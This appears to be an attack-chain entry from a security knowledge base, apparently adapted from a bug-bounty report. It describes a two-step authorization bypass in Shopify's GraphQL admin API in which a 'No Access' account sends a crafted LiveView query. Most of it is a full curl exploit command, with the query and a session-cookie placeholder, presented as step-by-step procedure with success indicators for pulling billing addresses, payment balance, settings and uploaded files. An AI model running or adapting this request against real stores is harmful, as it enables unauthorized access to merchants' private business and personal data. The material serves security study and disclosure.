---
id: ac-shopify-graphql-bypass-001
tags:
  - authorization-bypass
  - graphql
  - shopify
  - api
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: low
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Access-Low-Privilege-Shopify-Account]]'
  - '[[procedures/Exploit-Shopify-GraphQL-LiveView-Bypass]]'
step_count: 2
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:44.992Z'
description: >-
  Multi-stage attack exploiting improper permission checks in Shopify's GraphQL
  API to allow low-privilege users to access sensitive store information
  including billing addresses, settings, and uploaded files.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploit Public-Facing Application]]'
---
# Shopify GraphQL Authorization Bypass to Access Sensitive Store Data

Multi-stage attack chain demonstrating exploitation of permission bypass in Shopify's GraphQL API, allowing unauthorized access to private store data via low-privilege accounts.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Low |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Low-Privilege Login] --> B[Execution: GraphQL Query]
    B --> C[Objective: Data Exfiltration]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (uses standard HTTP client like curl)

### Target Environment

- Shopify store admin API
- Web platform with GraphQL endpoint (/admin/api/graphql)
- Network access to the target store domain (e.g., h1teststore2.myshopify.com)

### Initial Access Requirements

- Valid Shopify account with 'No Access' permissions on the target store
- Session cookie from login
- No elevated privileges required

## Detailed Attack Procedures

### Step 1: Initial Access
procedure: [[procedures/Access-Low-Privilege-Shopify-Account]]

**Objective**: Gain access to the target Shopify store using an account with minimal 'No Access' permissions to establish a low-privilege session.

**Instructions**: Log in to the Shopify admin panel using credentials for an account like 'attacker1' on the test store. This creates a session cookie that will be used for subsequent API requests. No special tools are needed; use a web browser or API client to authenticate.

**Expected Output**: Successful login with session cookie (e.g., extract from browser dev tools or use in requests).

**Success Indicators**:
- Login successful without errors
- Account shows 'No Access' permissions in the store settings

### Step 2: Execution
procedure: [[procedures/Exploit-Shopify-GraphQL-LiveView-Bypass]]

**Objective**: Send a crafted GraphQL query to the admin API endpoint to bypass authorization checks and retrieve sensitive store data such as billing addresses, features, product images, and uploaded files.

**Instructions**: Use the session from Step 1 to send a POST request to the /admin/api/graphql endpoint with the LiveView operation query. Include the session cookie in the request headers. The query requests fields like id, billingAddress, features, productImages, and uploadedImages.

Execute the request using [[commands/shopify-graphql-liveview-query]]:

```bash
curl -X POST https://h1teststore2.myshopify.com/admin/api/graphql.json \
  -H "Host: h1teststore2.myshopify.com" \
  -H "Connection: close" \
  -H "Content-Length: 1554" \
  -H "Accept: application/json" \
  -H "Origin: null" \
  -H "X-Shopify-Web-Force-Proxy: 1" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" \
  -H "Content-Type: application/json" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en-US,en;q=0.9,th;q=0.8,lo;q=0.7" \
  -H "Cookie: [SESSION_COOKIE]" \
  -d '{"operationName":"LiveView","variables":{},"query":"query LiveView { shop { id, billingAddress { address1, address2, city, company, country, firstName, lastName, latitude, longitude, name, phone, province, zip, __typename }, checkoutApiSupported, countriesInShippingZones { countryCodes, includeRestOfWorld }, currencyCode, customerAccounts, description, email, features { branding, captcha, captchaExternalDomains, dynamicRemarketing, giftCards, harmonizedSystemCode, liveView, multiLocation, onboardingVisual, reports, showMetrics, storefront, __typename }, __typename, ianaTimezone, myshopifyDomain, name, navigationSettings { id, title, url }, paymentSettings { supportedDigitalWallets }, plan { displayName, partnerDevelopment, shopifyPlus }, primaryDomain { host, id, sslEnabled, url }, publicationCount, resourceLimits { maxProductOptions, maxProductVariants, redirectLimitReached, skuResourceLimits { available, quantityAvailable, quantityLimit, quantityUsed } }, richTextEditorUrl, searchFilters { productAvailability { label, value } }, setupRequired, shipsToCountries, shopifyPaymentsAccount { balance { amount, currencyCode }, id }, taxShipping, taxesIncluded, timezoneOffset, timezoneOffsetMinutes, url, weightUnit, productImages(first:0) { edges { node { id, originalSrc, altText } } }, search(first:0, query: \"p\") { edges { cursor, node { description } }, resultsAfterCount } uploadedImages(first:0) { edges { cursor, node { altText, id, originalSrc } } } } }"}'
```

Replace [SESSION_COOKIE] with the actual cookie from login. This exploits the lack of permission checks in the LiveView operation.

**Expected Output**: HTTP 200 OK response with JSON containing shop data, e.g., {"data":{"shop":{"id":"gid://...","billingAddress":{"address1":"...",...},...}}}

**Success Indicators**:
- Response includes sensitive data like billing address or image URLs
- No authorization error (e.g., 403 Forbidden)

## Attack Chain Summary

### Key Achievements

1. Bypassed authorization to access store billing and settings
2. Retrieved product and uploaded image details with URLs
3. Demonstrated exposure of private business data via GraphQL API

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access

---

*Last updated: 2023-10-01T00:00:00Z*
